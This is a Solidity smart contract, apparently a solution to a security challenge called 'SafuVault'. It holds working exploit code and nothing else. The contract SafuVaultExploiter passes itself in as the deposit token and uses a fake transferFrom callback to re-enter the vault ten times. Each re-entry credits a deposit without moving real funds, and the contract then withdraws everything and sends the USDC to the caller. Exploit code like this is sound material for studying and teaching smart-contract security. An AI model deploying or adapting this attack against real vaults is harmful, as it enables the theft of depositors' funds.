// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ISafuVault {
    function depositFor(address, uint256, address) external;
    function withdrawAll() external;
}

contract SafuVaultExploiter {
    ISafuVault vault;
    IERC20 usdc;
    uint256 numOfLoops;

    constructor(address _vaultAddress, address _usdcAddress) {
        vault = ISafuVault(_vaultAddress);
        usdc = IERC20(_usdcAddress);
    }

    function attack() public {
        usdc.approve(address(vault), type(uint256).max);

        uint256 usdcBalance = usdc.balanceOf(address(this));
        uint256 amountPerLoop = usdcBalance / 10;

        vault.depositFor(address(this), amountPerLoop, address(this));

        vault.withdrawAll();

        usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
    }

    function transferFrom(address from, address to, uint256 amount) public {
        if (numOfLoops < 10) {
            ++numOfLoops;
            usdc.transfer(msg.sender, amount);
            vault.depositFor(address(this), amount, address(this));
        }
    }
}
